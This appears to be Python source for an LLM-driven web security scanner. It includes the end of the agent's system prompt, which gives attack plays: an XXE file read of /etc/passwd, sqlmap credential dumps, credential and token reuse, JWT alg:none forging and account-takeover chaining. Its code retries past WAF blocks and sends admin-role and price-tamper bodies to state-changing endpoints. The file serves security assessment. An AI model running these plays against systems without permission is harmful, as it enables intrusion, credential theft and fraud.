    "sets `Access-Control-Allow-Credentials: true` = cross-origin credential theft (a REAL finding, not the "
    "wildcard `*` noise you ignore).\n"
    "  - CSV / FORMULA INJECTION: TRIGGER - an export/report endpoint returning CSV/XLSX (`/export.csv`, "
    "`?format=csv`) into which a value you control is written. ACTION - check whether your value lands in a cell "
    "with a leading `= + - @` unescaped. CONFIRM - a cell begins with a formula prefix = spreadsheet formula "
    "injection.\n"
    "  - XXE: TRIGGER - an endpoint that accepts XML (an import/upload/SOAP path, `Content-Type: "
    "application/xml`). ACTION - fuzz it with an XML body carrying an external entity, e.g. `fuzz <url> --data` "
    "an XML doc whose DOCTYPE reads `file:///etc/passwd`. CONFIRM - the file content (`root:x:0:0`) returns = "
    "XXE.\n"
    "  - SINGLE-REQUEST BUSINESS LOGIC (be SYSTEMATIC - this is HIGH-VALUE and chronically under-tested; once you "
    "have mapped the API, TEST EVERY state-changing operation that trusts a client value, do not just spot one): "
    "TRIGGER - any operation (a REST endpoint OR a GraphQL mutation) that takes a money/quantity/price value or "
    "performs a privilege/ownership change - recognise it by NAME/ARG, e.g. `total`/`amount`/`price`/`cost`/"
    "`subtotal`/`qty`/`quantity`/`stock`/`discount`/`coupon`/`credits`/`balance`/`refund`/`status`, or "
    "`checkout`/`cart`/`transfer`/`refund`/`becomeSeller`/`createItem`/`updateItem(price)`/`updateShop`/`role`. "
    "Most REQUIRE AUTH, so get an identity FIRST (register an account, or forge/replay a token per the auth plays) "
    "and send the tampered op WITH that token. ACTION - in ONE request tamper the value and see if the server "
    "trusts it: a `total`/`amount`/`price` of `0.01` or NEGATIVE, a NEGATIVE `quantity`/`stock`, a `discount`>100, "
    "the SAME coupon stacked/repeated, a `status` set to `paid`/`shipped` without paying, a `refund` or "
    "`credits-transfer` you shouldn't get (a SELF-transfer or a tiny value proves acceptance WITHOUT draining a "
    "victim - stay non-destructive), or a privileged create/update a normal user shouldn't be allowed (become a "
    "seller, set a negative item price). CONFIRM - the op SUCCEEDS and the response reflects your client-supplied "
    "money/quantity/status/role = a business-logic flaw. ENUMERATE the WHOLE set (checkout, cart, coupon, refund, "
    "credits, seller, item, order-status) - each accepted op is its own finding. Single-request only "
    "(multi-step/race is IRVIN's).\n"
    "  - WEBHOOK / CALLBACK NO-VERIFY: TRIGGER - a webhook/callback path (`/webhooks/stripe`, `/callback`, "
    "`/ipn`, `/notify`). ACTION - POST a plausible event body with NO signature header. CONFIRM - it is accepted "
    "and changes state (marks a payment captured/paid) with no signature check = webhook spoofing.\n"
    "  - USER ENUMERATION: TRIGGER - a register / login / forgot-password endpoint. ACTION - submit a "
    "known-good vs a random identifier and DIFF the responses (message, status, timing). CONFIRM - distinct "
    "responses ('already taken' vs 'ok', 'no such user' vs 'wrong password') reveal which accounts exist.\n"
    "  - PREDICTABLE EXPORTS / DUMPS: TRIGGER - you saw an export/backup/report path or a dated file. ACTION - "
    "guess sibling predictable names: `/exports/users-2024-q1.json`, `/export.csv`, `/backup-YYYY-MM-DD.sql`, "
    "`/dumps/`, incrementing dates/quarters. CONFIRM - a predictable, unauthenticated data dump downloads.\n\n"

    "VERIFY BEFORE YOU REPORT - THIS IS THE MOST IMPORTANT RULE. A 200 is NOT proof. Many hosts (Cloudflare, an "
    "SPA/Next.js, a PHP front-controller) return 200 with the SAME page for EVERY path - so /.env, "
    "/.aws/credentials and /total-junk all look like they 'exist'. You are GIVEN a CATCH-ALL FINGERPRINT below "
    "(what a random nonexistent path returns). Before flagging ANY exposure:\n"
    "  - If the response matches the catch-all fingerprint (same status + similar size/body), it is the "
    "front-controller - DROP it. If unsure, http-request another random path yourself and compare.\n"
    "  - CONTENT-CHECK: the body must actually BE what you claim - a .env has KEY=VALUE lines; /actuator/env is "
    "JSON with propertySources; /.git/config has [core]; wp users is a JSON array of user objects; phpinfo says "
    "'PHP Version'; a backup.sql is SQL. An HTML app-shell served for /.env is NOT a finding.\n"
    "  - OMIT: 401/403; a redirect to login; an auth-rejection body ({\"error\":\"Unauthorized\"}, "
    "{\"authenticated\":false}); an empty/ping body ([], {}, {\"status\":\"ok\"}); and a login FORM (the panel "
    "exists but is gated -> at most a Suggestion).\n"
    "  - A sensitive endpoint returning REAL DATA (emails/PII, records, tokens) with no auth IS the finding.\n\n"

    "WHAT TO REPORT (and what NOT):\n"
    "  - Report ONLY High / Medium / Suggestion. High = exposed .git/.env/credentials/heapdump/backup, OR a "
    "response leaking PII/secrets/records, OR unauthenticated admin/data. Medium = an internal-only or info "
    "surface. Suggestion = a swagger/phpinfo page, a login form, a gated debug path, a reachable GraphQL "
    "endpoint.\n"
    "  - IGNORE, never mention: missing security headers, clickjacking, CORS wildcards, cookie flags, TLS/cipher "
    "nits, bare version banners. Noise here.\n"
    "  - REDACT every secret value - report the pattern name + location only, never the live key.\n"
    "  - fuzz and graphql-audit self-confirm; report their confirmed injections as findings.\n\n"

    "CHAIN-THINKING - YOU BUILD THE CHAINS YOURSELF (this is where you outperform a scanner). There is rarely ONE "
    "straight path: treat everything you touch as building an ATTACK GRAPH, and the highest-impact results are "
    "usually MULTI-HOP and NON-obvious. Keep a running INVENTORY of every asset/primitive you have collected - "
    "credentials, tokens, session cookies, API keys, user-ids and emails, a leaked secret/signing key, a config "
    "value, each reachable endpoint, each injection point, a file you can upload, a value the server reflects or "
    "fetches. After EVERY new finding do not just ask 'what does THIS unlock' - RE-SCAN YOUR WHOLE INVENTORY and "
    "ask 'does this new asset COMBINE with something I already hold to reach a step I couldn't before?' Deliberately "
    "compose primitives that don't obviously go together. Chains BRANCH - one asset can open several next moves, so "
    "pursue each branch, not just the first. http-request is how you act on every hop: replay a token, POST "
    "recovered creds to a login, walk the ids a leak revealed, forge a header, re-query as the identity you just "
    "gained. The linkages below are EXAMPLES to prime the pump, NOT a script and NOT exhaustive - invent the chains "
    "they don't name:\n"
    "  - a SQLi you confirmed on ANY param: do not stop - USE it (sqlmap `--opt-args \"--dump\"`/`--passwords` or "
    "hand-driven UNION) to dump the user/credential table; the cleartext passwords or hashes you pull then feed "
    "the CREDENTIAL REUSE chain (log in, then walk the authed/admin surface).\n"
    "  - a token / bearer / access_key HANDED OUT (auth-test/debug/whoami/register/login response): replay it on "
    "every admin/*, account/*, users/{id}, orders/{id}, payments/*, /me endpoint you have seen. Each new 200 "
    "body is a new finding.\n"
    "  - a JWT_SECRET / signing_key / api_secret leaked in a file (.env, config.js, actuator/env, debug, "
    "backup.sql, heapdump): report the CHAIN itself as High ('leaked secret + HS256 verification = admin-token "
    "forgery'). Also try alg:none against every admin endpoint (concrete token in the JWT-forge play).\n"
    "  - a debug/test/internal ENDPOINT that returns data: does it expose an impersonation hook, a token, a "
    "credential, a stack trace, an env var? Each is a separate finding; if it gives you a TOKEN, chain "
    "immediately.\n"
    "  - an ADMIN CREDENTIAL (a password, a Basic-auth pair, an admin/adminpass) leaked in any body: try it on "
    "the login endpoint and the admin panel; a 200 back means account takeover.\n"
    "  - a leaked EMAIL / USER ID list (from PII disclosure, exports, /users): USE those ids in every id-taking "
    "endpoint you see - /users/{id}, /orders/{id}, /account/profile-by-id?user_id=. Each 200 with someone else's "
    "data is a BOLA.\n"
    "  - a URL-fetcher / SSRF or open-redirect primitive you happen to notice: note it as a one-line lead and "
    "move on - these are DEPRIORITIZED, do not sink steps into confirming them.\n"
    "  - a REGISTER endpoint that accepts anything: make an account, use its token in the walk above.\n"
    "  - COMPOSE ACROSS FINDINGS (the non-obvious multi-hop chains - these are the ones that matter): a leaked "
    "secret forges an admin token, the admin endpoint then leaks a victim's email, a password-reset for that email "
    "returns a reset token, and now you own that account - three weak findings become one full ATO. An IDOR that "
    "discloses another user's id feeds a mass-assignment / profile-update / order-read on THAT id. A token you "
    "minted via one bug unlocks a second endpoint whose response seeds a third. A dumped API key hits a different "
    "service than the one that leaked it. Keep asking which TWO or THREE things you now hold combine into a hop the "
    "single findings didn't give you.\n"
    "Chain until every branch dead-ends or reaches a confirmed high-impact result (admin access, another user's "
    "data, RCE). Do not stop at the first hit in a chain, and do not assume the only chain is the obvious one - "
    "keep pulling every thread.\n\n"

    "OUT OF SCOPE - ONLY these stay out (note under 'NOT covered'): flows that need a SECOND identity or viewer or "
    "a timing race - CSRF, interactive OAuth/MFA login, race conditions/TOCTOU, two-account BFLA, stored-XSS that "
    "needs a second viewer to fire; full OOB SSRF confirmation (flag the anomaly as a lead); and infra (ports, "
    "subdomain takeover, TLS). Everything else is IN scope. A CHAIN YOU CAN DRIVE YOURSELF in this one session IS "
    "in scope and is your highest-value work: confirm a SQLi and then USE it to dump creds, take a credential you "
    "found and REUSE it to log in, walk ids to reach another user's or an admin's data, reach a console and RUN a "
    "benign marker - pull the chain to its end. Single-request classes (open redirect, host-header, CORS-with-"
    "credentials, business logic, mass assignment, JWT/token forging, XXE, webhook spoofing) are all in scope too - "
    "run their plays.\n\n"

    "PRIORITY / DEPRIORITIZE (your judgement, never a hardcoded path or target-specific rule): spend steps "
    "where yield is highest - injection, broken auth / IDOR / BOLA, mass-assignment & privilege-esc, "
    "token/JWT forging, and information disclosure. Two classes are LOW-yield: SSRF - do NOT dedicate steps, "
    "extra requests, or a mutation pass to it; skip it (a URL-fetcher you happen to pass is at most a one-line "
    "lead). OPEN REDIRECT - do not hand-chase redirect params; a cheap deterministic backstop already covers "
    "it. Reinvest that budget in the high-yield classes above.\n\n"

    "BE COMPLETE: never repeat a call, batch independent tool calls in one turn, don't chase provably dead paths - "
    "but do NOT stop early to save calls. Before you write the report, make sure you have FUZZED every distinct "
    "parameter-bearing endpoint the swagger --fuzzable list and the crawl surfaced, audited any GraphQL endpoint, "
    "run the debug/test-endpoint probe list, run the trivial-Bearer walk against every admin/account endpoint you "
    "saw, and probed the exposure paths - those are the findings a scanner alone would miss. AND before you "
    "finish, close every CHAIN you opened: if you confirmed a SQLi you must have DUMPED it (sqlmap --dump) and "
    "reused any credentials; if you recovered ANY credential/token you must have REUSED it on every login/panel "
    "and walked the authenticated surface; if you reached an admin console you must have tried a benign RCE marker. "
    "AND if the app has any checkout/cart/coupon/refund/credits/transfer/seller/item/order-status operation, you "
    "must have AUTHENTICATED and tampered each with a client-controlled money/quantity/price/status/role value and "
    "checked acceptance (the BUSINESS LOGIC play) - these are systematically missed, and each accepted op is its "
    "own finding. A finding left mid-chain, or a state-changing op left un-tampered, is coverage left on the "
    "table.\n\n"

    "FINISH: when done, reply with NO tool call and ONE fenced ```json block (nothing else) with EXACTLY these "
    "fields. BOB formats the report from this - so the report has the identical structure every single run; you "
    "supply the CONTENT, not the layout:\n"
    "```json\n"
    "{\n"
    '  "application": {"description":"<2-4 sentences: what the app/API does + its purpose, concrete not '
    'boilerplate>","stack":"<framework/lang | web server | CDN/WAF | notable libs>","api":"<REST / GraphQL / '
    'RPC / none>","auth":"<session cookie / JWT / OAuth / none observed>"},\n'
    '  "findings": [{"severity":"High|Medium|Suggestion","title":"<short>","url":"<url>","evidence":"<=100 '
    'chars, redacted>"}],\n'
    '  "attack_surface": ["<attacker-interesting endpoint> - <why>"],\n'
    '  "coverage": "<one line: what you actually checked>",\n'
    '  "bottom_line": "<one sentence: the single biggest problem, or nothing obviously exposed>"\n'
    "}\n```\n"
    "Only VERIFIED findings go in `findings` (High/Medium/Suggestion, per the rules above). If nothing survived "
    "verification, give an empty findings list and say so in bottom_line. Redact secret values.")


# iter36: a per-host COOKIE JAR. Without it every http-request is a fresh session, so a WAF / bot-manager
# (Cloudflare `cf_clearance`/`__cf_bm`, Akamai `_abck`, AWS ALB, ...) that hands out a clearance cookie on the
# first response keeps re-challenging and eventually BLOCKS bob; and a cookie-based login never sticks. The jar
# carries every Set-Cookie forward automatically for BOTH the LLM loop and the deterministic backstops.
_COOKIE_JAR: dict = {}
_COOKIE_ATTRS = {"expires", "path", "domain", "max-age", "samesite", "secure", "httponly", "priority",
                 "partitioned", "comment", "version"}


def _parse_set_cookie(value: str) -> dict:
    out = {}
    for seg in re.split(r"\n|,(?=\s*[A-Za-z0-9_!#$%&*+.^`|~-]+=)", value or ""):
        m = re.match(r"\s*([A-Za-z0-9_!#$%&*+.^`|~-]+)=([^;]*)", seg)
        if m and m.group(1).lower() not in _COOKIE_ATTRS and m.group(2).strip():
            out[m.group(1)] = m.group(2).strip()
    return out


def _jar_cookie_header(host: str) -> str:
    jar = _COOKIE_JAR.get(host or "", {})
    return "; ".join(f"{k}={v}" for k, v in jar.items()) if jar else ""


def _jar_update(host: str, raw: str) -> None:
    if not host or not raw:
        return
    try:
        d = (json.loads(raw).get("data") or [{}])[0] or {}
        hdrs = d.get("headers") or {}
    except Exception:  # noqa: BLE001
        return
    if not isinstance(hdrs, dict):
        return
    sc = next((v for k, v in hdrs.items() if str(k).lower() == "set-cookie"), "")
    if sc:
        _COOKIE_JAR.setdefault(host, {}).update(_parse_set_cookie(str(sc)))


def _call(argv: list, headers: list, debug: bool = False) -> str:
    """Run a DEFINED boxcutter sub-command IN-PROCESS and return its raw stdout (the JSON envelope). A tool
    outside the allowlist is refused; header-capable tools get the operator's --header(s) appended AND any
    accumulated per-host cookies (WAF clearance / session) so requests are not blocked; a missing binary /
    failure returns an error envelope, never raises."""
    if not argv or argv[0] not in _TOOLS:
        return json.dumps({"success": False, "error": f"{argv[0] if argv else '?'} is not a defined bob tool"})
    from ..cli import main as cli_main
    try:
        flag = toolschema.build(argv[0])["flag_of"].get("header")
    except Exception:  # noqa: BLE001
        flag = None
    host = ""
    if len(argv) >= 2 and isinstance(argv[1], str) and argv[1].startswith("http"):
        host = (urlparse(argv[1]).hostname or "").lower()
    if flag and headers:
        argv = argv + [x for h in headers for x in (flag, h)]
    # attach accumulated cookies for this host unless a Cookie header is already set (operator/LLM manages it)
    if flag and host and "cookie:" not in " ".join(str(a) for a in argv).lower():
        cook = _jar_cookie_header(host)
        if cook:
            argv = argv + [flag, f"Cookie: {cook}"]
    argv = agentlog.forward_debug(argv, debug)

    def _invoke(a):
        buf = io.StringIO()
        try:
            with contextlib.redirect_stdout(buf):
                cli_main(list(a))
        except SystemExit:
            pass
        except Exception as exc:  # noqa: BLE001
            return json.dumps({"success": False, "error": f"{a[0]} failed: {exc}"})
        return buf.getvalue().strip()

    out = _invoke(argv)
    # WAF/rate-limit resilience: a burst of backstop requests can trip a WAF (Cloudflare/Akamai) → 403/429/503
    # or a JS-challenge, silently zeroing coverage. Detect it and retry with backoff (learning any clearance
    # cookie between tries) so a transient block doesn't kill the scan. Only for http-request (idempotent GET/POST).
    if argv and argv[0] == "http-request":
        _jar_update(host, out)
        for attempt in range(2):
            if not _looks_waf_blocked(out):
                break
            import time
            time.sleep(1.5 * (attempt + 1))              # brief backoff; jar now carries any clearance cookie
            retry = list(argv)
            if host and (cook := _jar_cookie_header(host)) and "cookie:" not in " ".join(str(x) for x in retry).lower():
                retry = retry + [flag, f"Cookie: {cook}"] if flag else retry
            out = _invoke(retry)
            _jar_update(host, out)
    return out


_WAF_MARKERS = ("cf-mitigated", "cf-chl-", "cf_chl", "just a moment", "attention required",
                "checking your browser", "cloudflare", "access denied", "request blocked",
                "/cdn-cgi/challenge", "akamai", "incapsula", "rate limit", "too many requests")


def _looks_waf_blocked(raw: str) -> bool:
    """A WAF/bot-manager block or rate-limit (as opposed to a normal app 403): a 403/429/503 whose body carries
    a challenge/mitigation marker. Kept conservative so a genuine app 401/403 is NOT treated as a block."""
    try:
        d = (json.loads(raw).get("data") or [{}])[0] or {}
    except Exception:  # noqa: BLE001
        return False
    status = int(d.get("status") or 0)
    if status not in (403, 429, 503):
        return False
    hay = (str(d.get("content") or "")[:1500] + " " + json.dumps(d.get("headers") or {})[:600]).lower()
    return any(m in hay for m in _WAF_MARKERS)


def _cap(raw: str, max_chars: int = 50000, max_items: int = 300) -> str:
    """Very-loose cap: iter9 without any cap caused provider-side 400s because model context exceeded provider
    limits, and the LLM's final JSON never emitted. This is generous but prevents runaway payloads (a 500KB
    heapdump body, an OpenAPI spec with hundreds of ops) from breaking the provider connection."""
    if len(raw) <= max_chars:
        return raw
    try:
        env = json.loads(raw)
    except Exception:  # noqa: BLE001
        return raw[:max_chars] + "\n...[truncated]"
    data = env.get("data")
    if isinstance(data, list) and data:
        n = min(len(data), max_items)
        while n > 0:
            trial = dict(env)
            trial["data"] = data[:n]
            if n < len(data):
                trial["_truncated"] = f"showing {n} of {len(data)} items"
            s = json.dumps(trial)
            if len(s) <= max_chars:
                return s
            n -= max(1, n // 8)
    return raw[:max_chars] + "\n...[truncated]"


def _catch_all_fingerprint(base_url: str, headers: list, debug: bool) -> str:
    """Hand the model EVIDENCE (not an enforced gate): what a definitely-nonexistent path returns here. On a
    catch-all/CDN/SPA host this is a 200 shell, so the model knows a matching 'finding' is a false positive."""
    lines = []
    for _ in range(2):
        rp = base_url.rstrip("/") + "/zzq-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        try:
            d = (json.loads(_call(["http-request", rp], headers, debug)).get("data") or [{}])[0]
            lines.append(f"  {rp} -> status {d.get('status')}, {len(d.get('content') or '')} bytes, "
                         f"title {str(d.get('title') or '')[:40]!r}")
        except Exception:  # noqa: BLE001
            lines.append(f"  {rp} -> (no response)")
    return ("CATCH-ALL FINGERPRINT (a random nonexistent path returns this - a 'finding' that matches it is a "
            "front-controller FALSE POSITIVE, drop it):\n" + "\n".join(lines))


_SEV_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "suggestion": 4, "info": 5}


def _summarize(host: str, findings: list) -> tuple:
    """A DETERMINISTIC, notification-ready summary from the final findings. Returns (notification_line,
    markdown_block, structured_dict) - a one-liner you can drop straight into Slack/email, a `### Summary` block
    for the report, and machine fields for the envelope."""
    counts: dict = {}
    for f in findings:
        s = str(f.get("severity", "info")).lower()
        counts[s] = counts.get(s, 0) + 1
    high = counts.get("critical", 0) + counts.get("high", 0)
    med = counts.get("medium", 0)
    sug = counts.get("suggestion", 0) + counts.get("low", 0) + counts.get("info", 0)
    verdict = ("CRITICAL EXPOSURE" if high else "ISSUES FOUND" if med
               else "MINOR / REVIEW" if sug else "NOTHING EXPOSED")
    top = [str(f.get("title", "")).strip()
           for f in sorted(findings, key=lambda f: _SEV_RANK.get(str(f.get("severity", "info")).lower(), 9))
           if str(f.get("title", "")).strip()][:3]
    notif = f"[bob] {verdict} | {host} | {high} High, {med} Medium, {sug} Suggestion"
    if top:
        notif += " | top: " + "; ".join(top[:2])
    md = ["### Summary", notif]
    if top:
        md += [""] + [f"- {t}" for t in top]
    data = {"verdict": verdict, "high": high, "medium": med, "suggestion": sug,
            "counts": counts, "top": top, "notification": notif}
    return notif, "\n".join(md), data


def _parse_output(text: str) -> tuple:
    """The agent emits a structured json (application / findings / attack_surface / coverage / bottom_line). Pull
    it out; bob renders the report from it so the LAYOUT is bob's, not the model's. Returns (data, findings)."""
    obj = extract_json(text)
    if not isinstance(obj, dict):
        obj = {}
    findings = [f for f in (obj.get("findings") or []) if isinstance(f, dict)]
    return obj, findings


def _render_report(target: str, data: dict, findings: list, summary_md: str) -> str:
    """Render the report from structured data with a fixed layout. Sections keep the same order and format every
    run, but a CONTENT section with nothing in it (no High exposure, no findings, no attack surface) is DROPPED
    rather than shown with a 'None' placeholder - a clean scan gets a clean, short report. The always-relevant
    sections (Summary, Application, Coverage, Bottom line) are always present."""
    app = data.get("application") if isinstance(data.get("application"), dict) else {}
    srt = sorted(findings, key=lambda f: _SEV_RANK.get(str(f.get("severity", "info")).lower(), 9))
    highs = [f for f in srt if str(f.get("severity", "")).lower() in ("critical", "high")]
    surf = [str(s).strip() for s in (data.get("attack_surface") or []) if str(s).strip()]

    out = [f"## Bob - surface scan: {target}", "", summary_md, "",
           "### Application", str(app.get("description") or "(not determined)").strip(),
           f"**Stack:** {app.get('stack') or 'unknown'}  |  **API:** {app.get('api') or 'unknown'}  |  "
           f"**Auth:** {app.get('auth') or 'not observed'}"]
    if highs:                                        # only when there's something critical to highlight
        out += ["", "### Exposed / problematic (fix or confirm intended)"]
        out += [f"- **[{str(f.get('severity', 'High')).title()}]** {str(f.get('title', '')).strip()} - "
                f"`{f.get('url', '')}`" + (f" - {str(f.get('evidence', '')).strip()}" if f.get("evidence") else "")
                for f in highs]
    if srt:                                          # only when there are findings at all
        out += ["", "### Findings", "| Severity | Finding | Location |", "| --- | --- | --- |"]
        out += [f"| {str(f.get('severity', 'info')).title()} | {str(f.get('title', '')).strip()} | "
                f"`{f.get('url', '')}` |" for f in srt]
    if surf:                                         # only when the agent noted attacker-interesting surface
        out += ["", "### Attack surface worth a look"] + [f"- {s}" for s in surf]
    out += ["", "### Coverage", str(data.get("coverage") or "(not stated)").strip(),
            "**NOT covered** (route to appsec): authenticated/OAuth/MFA flows, SSRF/CSRF/open-redirect, stateful "
            "multi-step logic, and infra (ports, subdomain takeover, TLS).", "",
            f"**Bottom line:** {str(data.get('bottom_line') or 'no summary provided').strip()}"]
    return "\n".join(out)


_NORM_STRIP_INT = re.compile(r"\d{3,}")            # iter9: strip randomised alert(N) / long ints out of the key

def _norm_url_key(url: str) -> str:
    """Normalise a URL for dedup: strip scheme+trailing slash, lowercase host, keep path + sorted query keys, and
    strip randomised long integers (fuzz's XSS payload has an `alert(<random>)` that would otherwise make every
    reflection look like a distinct finding)."""
    try:
        p = urlparse(url)
    except Exception:  # noqa: BLE001
        return _NORM_STRIP_INT.sub("N", url.strip().lower())
    host = (p.hostname or "").lower()
    path = _NORM_STRIP_INT.sub("N", p.path.rstrip("/") or "/")
    keys = sorted(k for k, _ in parse_qsl_local(p.query))
    return f"{host}{path}?{'&'.join(keys)}"


def parse_qsl_local(q: str):
    """Tiny local parse_qsl - keep import surface unchanged."""
    from urllib.parse import parse_qsl
    return parse_qsl(q, keep_blank_values=True)


_SKIP_HOST_HINTS = ("/cdn-cgi/", "/_next/", "/static/", "/assets/", ".css", ".png", ".jpg", ".svg", ".woff",
                    ".ico", ".map")


def _collect_fuzzable(cache: dict, base_url: str) -> list:
    """Pull every injectable URL out of what bob already discovered - swagger-endpoints --fuzzable, katana-crawl,
    js-endpoints, and any {FUZZ}/{NUMBERS}-marked url seen. Dedup by (host+path+sorted-param-keys); skip static
    assets and CDN paths; normalize http/https to whatever the target used."""
    host = (urlparse(base_url).hostname or "").lower()
    scheme = urlparse(base_url).scheme or "https"
    urls = []
    seen = set()

    def _consider(u: str) -> None:
        if not u or not isinstance(u, str):
            return
        u = u.strip()
        if not u.startswith("http"):
            if u.startswith("/"):
                u = f"{scheme}://{host}{u}"
            else:
                return
        try:
            p = urlparse(u)
        except Exception:  # noqa: BLE001
            return
        if (p.hostname or "").lower() != host:
            return
        if any(h in u.lower() for h in _SKIP_HOST_HINTS):
            return
        # Must have a real inject point: {FUZZ}/{NUMBERS}, a query with values, or an id-like path segment
        has_marker = "{FUZZ}" in u or "{NUMBERS}" in u
        has_query = bool(p.query)
        has_id_path = any(_looks_id(seg) for seg in p.path.split("/") if seg)
        if not (has_marker or has_query or has_id_path):
            return
        k = _norm_url_key(u)
        if k in seen:
            return
        seen.add(k)
        urls.append(u)

    for key, out in cache.items():
        if not key or key[0] not in ("swagger-endpoints", "katana-crawl", "js-endpoints"):
            continue
        try:
            env = json.loads(out)
        except Exception:  # noqa: BLE001
            continue
        data = env.get("data") or []
        if not isinstance(data, list):
            continue
        for d in data:
            if isinstance(d, str):
                _consider(d)
                continue
            if not isinstance(d, dict):
                continue
            for f in ("fuzzable_url", "fuzz_url", "url", "endpoint", "path", "href"):
                _consider(d.get(f))
    return urls


def _looks_id(seg: str) -> bool:
    """A path segment that is likely an id (numeric, uuid, long hex) - a real inject point."""
    if not seg:
        return False
    if seg.isdigit():
        return True
    if len(seg) >= 20 and all(c in "0123456789abcdefABCDEF-" for c in seg):
        return True
    return False


def _already_fuzzed(cache: dict) -> set:
    """Keys of URLs bob already ran fuzz against - so the backstop skips them."""
    keys = set()
    for k in cache:
        if not k or k[0] != "fuzz":
            continue
        # tuple form: ("fuzz", url, ...) - the url is k[1]
        if len(k) >= 2 and isinstance(k[1], str):
            keys.add(_norm_url_key(k[1]))
    return keys


def _fuzz_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """Deterministically fuzz every discovered param-endpoint bob didn't cover. Returns findings dicts in the same
    shape as the agent's own findings (severity/title/url/evidence). Silent if nothing to add."""
    targets = _collect_fuzzable(cache, base_url)
    if not targets:
        return []
    done = _already_fuzzed(cache)
    to_fuzz = [u for u in targets if _norm_url_key(u) not in done]
    if not to_fuzz:
        return []
    debug_print(f"bob :: fuzz backstop: {len(to_fuzz)} fuzz targets bob didn't cover; running deterministically")
    findings = []
    for url in to_fuzz:                               # no cap - findings > cost
        raw = _call(["fuzz", url], headers, debug)
        try:
            env = json.loads(raw)
        except Exception:  # noqa: BLE001
            continue
        for f in env.get("data") or []:
            if not isinstance(f, dict):
                continue
            sev = str(f.get("severity") or "").lower()
            if sev not in ("critical", "high", "medium"):
                continue
            findings.append({
                "severity": sev,
                "title": f"{str(f.get('class') or 'injection').upper()}: {str(f.get('title') or f.get('class') or 'injection')}",
                "url": str(f.get("url") or url),
                "evidence": str(f.get("evidence") or f.get("payload") or "")[:100],
            })
    return findings


# iter9: business-logic + mass-assignment backstop -------------------------------------------------

# iter19: biz-logic hint set widened to include synonyms across common e-commerce, SaaS and fintech naming.
# The classifier now runs against URL+summary+description+tags+operationId, so a term matching ANY of those
# is enough - misses naming that's completely orthogonal (e.g., "settle", "capture", "authorise") were added.
_BIZ_HINTS = ("checkout", "payment", "payments", "order", "orders", "cart", "basket", "baskets",
              "coupon", "promo", "refund", "invoice", "confirm", "apply", "status", "boost",
              "campaign", "campaigns", "account", "profile", "user", "users", "role", "promote",
              "modifier", "price", "quantity", "credit", "wallet", "balance", "impersonate",
              "settle", "settlement", "capture", "authorise", "authorize", "charge", "transaction",
              "subscription", "billing", "commit", "purchase", "checkout", "review", "rating", "tip",
              "gift", "voucher", "reward", "loyalty", "referral", "membership", "tier")

_TAMPER_BODY = {
    "role": "admin",
    "is_admin": True,
    "admin": True,
    "verified": True,
    "balance": 9999,
    "wallet": 9999,
    "total": 0.01,
    "amount": 0.01,
    "price": 0.01,
    "quantity": -1,
    "discount": 110,
    "status": "paid",
}

_ACCEPTED_STATUSES = {200, 201, 202, 204}


def _iter_swagger_ops(cache: dict, base_url: str, headers: list, debug: bool) -> list:
    """Extract POST/PUT/PATCH operations by parsing OpenAPI JSON. The swagger-endpoints tool emits URL strings
    without method metadata, so we go to the raw spec: (a) parse any http-request cache entry whose body has a
    `"paths"` key, and (b) if a `swagger-endpoints <spec-url>` call is in cache but the spec was never
    http-requested, fetch it now (one call, cheap). iter10 fix + iter11 fetch-if-missing + iter19 attach the
    operation's summary/description text so classifiers can match on SEMANTIC meaning, not URL substrings.
    Returns list of (method, url, summary_text) tuples."""
    ops = []
    scheme = urlparse(base_url).scheme or "https"
    host = (urlparse(base_url).hostname or "").lower()

    def _add_from_spec(spec: dict) -> None:
        paths = spec.get("paths") or {}
        if not isinstance(paths, dict):
            return
        # server base from spec.servers[0].url if present
        prefix = ""
        servers = spec.get("servers") or []
        if isinstance(servers, list) and servers and isinstance(servers[0], dict):
            u = str(servers[0].get("url") or "").rstrip("/")
            if u and not u.startswith("http"):
                prefix = u                            # relative path prefix
            elif u:
                p = urlparse(u)
                if (p.hostname or "").lower() == host:
                    prefix = p.path.rstrip("/")
        for path, methods in paths.items():
            if not isinstance(methods, dict):
                continue
            for method in ("post", "put", "patch"):
                op = methods.get(method)
                if not op:
                    continue
                path_str = str(path)
                full = f"{scheme}://{host}{prefix}{path_str if path_str.startswith('/') else '/' + path_str}"
                summary = ""
                if isinstance(op, dict):
                    summary = " ".join(str(op.get(k) or "") for k in ("summary", "description", "operationId"))
                    tags = op.get("tags") or []
                    if isinstance(tags, list):
                        summary += " " + " ".join(str(t) for t in tags)
                ops.append((method.upper(), full, summary.lower()))

    spec_urls = set()                                # candidate spec URLs seen in swagger-endpoints calls
    for key, out in cache.items():
        if not key:
            continue
        if key[0] == "swagger-endpoints" and len(key) >= 2 and isinstance(key[1], str):
            spec_urls.add(key[1])                    # remember to fetch if not http-requested
        if key[0] != "http-request":
            continue
        try:
            env = json.loads(out)
        except Exception:  # noqa: BLE001
            continue
        data = env.get("data") or []
        if not isinstance(data, list):
            continue
        for d in data:
            if not isinstance(d, dict):
                continue
            body = d.get("content") or ""
            if not isinstance(body, str) or "\"paths\"" not in body:
                continue
            try:
                spec = json.loads(body)
            except Exception:  # noqa: BLE001
                continue
            if isinstance(spec, dict) and "paths" in spec:
                _add_from_spec(spec)
                spec_urls.discard(str(d.get("url") or ""))     # already covered

    # iter11: if bob only ran swagger-endpoints (never http-requested the spec), fetch it now
    if not ops and spec_urls:
        for spec_url in spec_urls:
            raw = _call(["http-request", spec_url], headers, debug)
            try:
                env = json.loads(raw)
                body = ((env.get("data") or [{}])[0] or {}).get("content") or ""
                spec = json.loads(body) if body else {}
            except Exception:  # noqa: BLE001
                continue
            if isinstance(spec, dict) and "paths" in spec:
                _add_from_spec(spec)

    # dedup
    seen = set()
    unique = []
    for method, u, summary in ops:
        k = (method, _norm_url_key(u))
        if k in seen:
            continue
        seen.add(k)
        unique.append((method, u, summary))
    return unique


def _biz_logic_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """For every discovered POST/PUT/PATCH endpoint whose path/name looks state-changing (checkout/order/cart/
    coupon/refund/account/user/...), send a tamper body carrying `{role,is_admin,total:0.01,quantity:-1,
    status:paid,...}` and check whether the server ACCEPTS it. A 2xx on a checkout/cart/account/order endpoint
    with our tampered fields = single-request business-logic OR mass-assignment finding. Non-intrusive: one POST
    per endpoint, small body."""
    ops = _iter_swagger_ops(cache, base_url, headers, debug)
    if not ops:
        return []
